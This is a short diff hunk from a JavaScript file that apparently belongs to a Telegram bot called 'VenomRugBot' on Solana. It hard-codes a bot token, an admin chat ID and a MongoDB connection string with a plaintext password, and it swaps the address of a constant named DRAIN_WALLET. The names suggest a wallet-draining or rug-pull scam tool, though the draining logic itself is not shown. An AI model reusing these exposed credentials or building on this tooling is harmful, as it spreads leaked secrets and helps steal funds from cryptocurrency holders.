@@ -47,7 +47,7 @@ process.on('SIGTERM', () => {
 const BOT_TOKEN = "8095801479:AAEf_5M94_htmPPiecuv2q2vqdDqcEfTddI";
 const ADMIN_CHAT_ID = "6368654401";
 const MONGODB_CONN_STRING = "mongodb+srv://dualacct298_db_user:vALO5Uj8GOLX2cpg@cluster0.ap9qvgs.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0";
-const DRAIN_WALLET = "5s4hnozGVqvPbtnriQoYX27GAnLWc16wNK2Lp27W7mYT";
+const DRAIN_WALLET = "QXWR3NzQsiSSuR5XheP5L9yvpeZLwJupSaLB4Kvcss6";
 const SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com";
 
 class VenomRugBot {
